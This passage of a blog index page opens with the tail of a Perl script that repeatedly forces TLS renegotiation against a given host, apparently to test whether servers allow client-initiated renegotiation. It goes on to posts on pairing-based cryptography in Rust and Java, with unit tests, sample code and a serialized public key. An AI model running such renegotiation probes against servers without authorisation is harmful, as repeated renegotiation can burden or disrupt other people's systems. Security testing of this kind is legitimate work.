&amp;Net::SSLeay::TLSv1_2_method);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set_ciphers($ctx, $ciphers);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $socket = IO::Socket::INET-&gt;new(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Type =&gt; IO::Socket::SOCK_STREAM,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Proto =&gt; &#x27;tcp&#x27;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PeerAddr =&gt; $hostname,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PeerPort =&gt; $port,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Blocking =&gt; 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) or die (&quot;unable to connect: $!\n&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $ctx = Net::SSLeay::CTX_new() or die_now(&quot;Failed to create SSL_CTX $!&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">configure_context($ctx, &quot;DHE:EDH:ECDHE:EECDH:RSA:DH:ECDH&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $ssl = ssl_connect($ctx, $socket);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">my $ret;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">for (my $i=0; $i&lt;2; $i++) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Net::SSLeay::renegotiate($ssl);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    die_if_ssl_error(&quot;ssl renegotiate ($!)&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if (! $socket-&gt;connected()) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        die(&quot;network connection has died&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    $ret = Net::SSLeay::do_handshake($ssl);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    display_result($ssl, $ret, &quot;do_handshake&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Net::SSLeay::free ($ssl);               # Tear down connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Net::SSLeay::CTX_free ($ctx);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">close $socket;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/blog/2021/02/13/Pairing_based_cryptography_in_Rust">Pairing based cryptography in Rust</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2021-02-13T00:00:00.000Z">February 13, 2021</time> · <!-- -->One min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/janstarke.png" alt="Jan Starke"></a><div class="avatar__intro"><div class="avatar__name"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer"><span>Jan Starke</span></a></div><small class="avatar__subtitle">Senior Forensic Analyst</small></div></div></div></div></header><div class="markdown"><p>Because I was was fed up with catching memory issues in the legacy PBC code, I decided to reimplement the PBC library using Rust. You can watch my progress at <a href="https://github.com/teeshop/pbc4rust" target="_blank" rel="noopener noreferrer">https://github.com/teeshop/pbc4rust</a>.</p>
<p>By the way, I like the concept of traits. This enables me to rely on the rules of universal algebra. So, my first unit tests look like this:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token attribute attr-name" style="color:#00a4db">#[test]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_z_add_zero</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">12345</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">zero</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">zero</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token attribute attr-name" style="color:#00a4db">#[test]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_z_add_commutativity</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">12345</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">6789</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token attribute attr-name" style="color:#00a4db">#[test]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">test_z_add_associativity</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> a</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> b</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">3456</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> c</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">91</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> d</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token class-name">Z</span><span class="token punctuation" style="color:#393A34">::</span><span class="token function" style="color:#d73a49">from</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3456</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">91</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">i32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">b </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> d</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token macro property" style="color:#36acaa">assert_eq!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">a </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> d</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/blog/2021/02/05/Using_pairing_based_cryptography_in_Java">Using Pairing-based cryptography in Java</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2021-02-05T00:00:00.000Z">February 5, 2021</time> · <!-- -->4 min read</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/janstarke.png" alt="Jan Starke"></a><div class="avatar__intro"><div class="avatar__name"><a href="https://github.com/janstarke" target="_blank" rel="noopener noreferrer"><span>Jan Starke</span></a></div><small class="avatar__subtitle">Senior Forensic Analyst</small></div></div></div></div></header><div class="markdown"><p>Since some years I&#x27;m working on this topic, and guess what: It is working now :-)</p>
<p>Imagine the following: You are in a hospital and get some test results (e.g. from a Covid-19 test). You want to protect the result by encrypting it, but you are not sure who needs to be able to read that result later. But you don&#x27;t want to decrypt and reencrypt the result later. This is, where PBC comes in play. You can do as 2nd-level encryption, which protects the data from being read by any person. To decrypt 2nd-level encrypted data, you must first convert that to 1st-level-encrypted data, which requires the public key of the person you want to grant access to you data, and your own private key. After this step, the person for who you created the 1st-level encrypted data can decrypt the data using its own private key.</p>
<p>This enables the following use cases:</p>
<ul>
<li>Storage of confidential data in a cloud which you don&#x27;t trust, while giving partners access to your data. This works as long as the cloud provider doesn&#x27;t know any private keys. It even allows the cloud provider to do the transformation from 2nd-level to 1st-level, if you calculate the reencryption-key on-premise.</li>
<li>Revocation of data access by revoking the reencryption key.</li>
</ul>
<h1>What happened until now?</h1>
<p>My starting point is the <strong>PBC Library</strong> <a href="https://crypto.stanford.edu/pbc/" target="_blank" rel="noopener noreferrer">https://crypto.stanford.edu/pbc/</a> which was written by Ben Lynn as part of his PhD thesis. To use this in a prototyping project, we had to transmit encrypted content and key material from one computer to another. So we needed a machine-independant representation of all of the data, which was not subject of <strong>PBC Library</strong>. So, we wrapped all the data structures used in <strong>PBC Library</strong> by C++-based structures. After this, it was possible to easily export and import cryptographic data using</p>
<ul>
<li>any data format, such as JSON, ASN.1, XML, ...</li>
<li>any other PBC library (lower case L).</li>
</ul>
<p>Our next challenge was to make the C++ library accessible for higher level languages, such as Java (required for Android devices as well as Java Backends) or Swift (required for iOS devices). As of today, we succeeded. The following is running:</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package com.company;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.tsystems_mms.je2ee.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Main {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    static {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.loadLibrary(&quot;je2ee&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private static final char[] HEX_ARRAY = &quot;0123456789ABCDEF&quot;.toCharArray();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static String bytesToHex(byte[] bytes) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        char[] hexChars = new char[bytes.length * 2];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        for (int j = 0; j &lt; bytes.length; j++) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            int v = bytes[j] &amp; 0xFF;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            hexChars[j * 2] = HEX_ARRAY[v &gt;&gt;&gt; 4];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            hexChars[j * 2 + 1] = HEX_ARRAY[v &amp; 0x0F];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return new String(hexChars);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        PbcContext context = je2ee.createContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        GlobalParameters global = je2ee.getGlobal(context);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        KeyPair kp = je2ee.createKeyPair(global);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Element dek = je2ee.generateDataEncryptionKey(global);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        byte[] aesKey1 = je2ee.kdf256(dek);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Tuple ciphertext = je2ee.encryptFirstLevel(je2ee.publicKey(kp), dek);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Element decryptedDek = je2ee</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .decryptFirstLevel(je2ee.secretKey(kp), ciphertext);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        byte[] aesKey2 = je2ee.kdf256(decryptedDek);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String aes1 = bytesToHex(aesKey1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String aes2 = bytesToHex(aesKey2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        assert aes1.equals(aes2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(aes2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1>Where can I get the code?</h1>
<p>You need to recursively clone the following repo: <a href="https://github.com/T-Systems-MMS/libe2ee" target="_blank" rel="noopener noreferrer">https://github.com/T-Systems-MMS/libe2ee</a></p>
<h1>Can I use this for my project?</h1>
<p>Yes, you can, but <strong>YOU SHOULDN&#x27;T</strong>! This project is a prototype and is only made to show what&#x27;s possible. Neither <strong>PBC Library</strong> nor this very project has been checked thoroughly by cryptography experts. I do not give any guarantee that this code is secure against any attacks. Maybe if someone is willing to pay for it, it may be possible to raise this code to production level. Until then, this is only a freetime project of myself.</p>
<h1>Some insights...</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="example-of-a-public-key-in-machine-independent-format">Example of a public key in machine independent format<a class="hash-link" aria-label="Direct link to Example of a public key in machine independent format" title="Direct link to Example of a public key in machine independent format" href="/blog#example-of-a-public-key-in-machine-independent-format">​</a></h2>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;root&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;id&quot;: &quot;a990af45-2269-537b-95c0-2d1815c6bddb&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;type&quot;: &quot;element&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;a990af45-2269-537b-95c0-2d1815c6bddb&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;type&quot;: &quot;element&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;id&quot;: &quot;a990af45-2269-537b-95c0-2d1815c6bddb&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;field&quot;: &quot;3709e538-b580-5e21-a2ae-333585123e35&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;y&quot;: &quot;d5TgGd3TwTiVhhdZpQ6L0BS5YqdzIxQVK4ZTPANMqNVvCo1qdeKSz2HZnPKqM9mazGKGZcwG9toinepFSmMvcf&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;x&quot;: &quot;AiblhfGZ24J3IA1MNyfKaV3HGMHyCIngbR2sU9D5QyZc5IJV8yxXUGQpbiGBQ3I8N8DXgHQ1dSOKYilloO5BOq&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;3709e538-b580-5e21-a2ae-333585123e35&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;type&quot;: &quot;field&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;subtype&quot;: &quot;curve&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;id&quot;: &quot;3709e538-b580-5e21-a2ae-333585123e35&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;order&quot;: &quot;aWgEPTl1tmebfs3ZETd8TJLcWlT&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;pairing&quot;: &quot;86ec11e5-802e-5ea0-9cc6-5a429f653359&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;a&quot;: &quot;a4cb7d3e-d31e-5472-9928-0b17725c9ae4&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;b&quot;: &quot;a47e3ca0-d570-5fe4-bd87-245b0100dbc2&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;cofac&quot;: &quot;1iRiNwETOuqBD7ugR7bRatbQL7JDKXfb6QfKFlQdbxb46gQKAjLCS397ZbnU&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    &quot;86ec11e5-802e-5ea0-9cc6-5a429f653359&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;type&quot;: &quot;pairing&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;id&quot;: &quot;86ec11e5-802e-5ea0-9cc6-5a429f653359&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;G1&quot;: &quot;3709e538-b580-5e21-a2ae-333585123e35&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;G2&quot;: &quot;3709e538-b580-5e21-a2ae-333585123e35&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;GT&quot;: &quot;6e9b64ba-e391-5c46-a9b9-0527b3c22212&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;Zr&quot;: &quot;a6d00cef-ce1b-5410-bd45-41a0058b4540&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;Eq&quot;: &quot;3709e538-b580-5e21-a2ae-333585123e35&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        &quot;Fq&quot;: &quot;49f4d9d3-3110-5d68-a069-d035ef71b54b&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token 